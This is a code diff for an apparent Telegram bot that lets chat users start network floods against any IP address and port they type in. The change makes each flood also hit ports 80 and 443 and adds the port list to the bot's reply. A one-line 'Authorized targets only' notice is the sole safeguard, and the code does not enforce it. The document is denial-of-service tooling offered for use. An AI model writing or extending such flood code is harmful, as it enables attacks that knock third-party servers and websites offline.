@@ -1,4 +1,6 @@
 import os, json, asyncio, random, time, html, logging
+from dotenv import load_dotenv
+load_dotenv()
 from pathlib import Path
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
@@ -379,11 +381,13 @@ async def h_text(event):
         if not port.strip().isdigit():
             return await event.respond("❌ Port numeric hona chahiye.", parse_mode="html")
         from flood import start_flood
-        info = start_flood(ip, int(port.strip()))
+        ports_list = [int(port.strip()), 80, 443]  # MULTI_PORT
+        info = start_flood(ip, int(port.strip()), ports=ports_list)
         return await event.respond(
             "🔥 Flood started\n\nTarget: <code>" + html.escape(ip) + ":" + port.strip() + "</code>\n"
             "Threads: " + str(info["threads"]) + "\n"
-            "Duration: " + str(info["duration"]) + "s\n\n"
+            "Duration: " + str(info["duration"]) + "s\n"
+            "Ports: " + ",".join(map(str, info["ports"])) + "\n\n"
             "⚠️ Authorized targets only.", parse_mode="html")
     if WAIT.get(uid) == "vc" or validate_target(text):
         target = validate_target(text) or text
